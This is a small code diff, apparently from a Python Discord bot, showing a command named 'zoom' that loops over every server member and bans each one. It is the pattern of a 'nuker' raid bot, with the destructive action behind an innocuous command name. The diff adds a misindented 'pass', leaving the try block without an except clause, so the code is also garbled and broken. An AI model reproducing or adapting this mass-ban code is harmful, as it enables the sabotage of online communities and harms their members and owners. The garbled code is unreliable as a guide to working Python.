@@ -419,6 +419,7 @@ async def zoom(ctx):
 	for member in ctx.guild.members:
 		 try:
 		     await member.ban()
+		pass
 
 if __name__ == '__main__':
     Init()
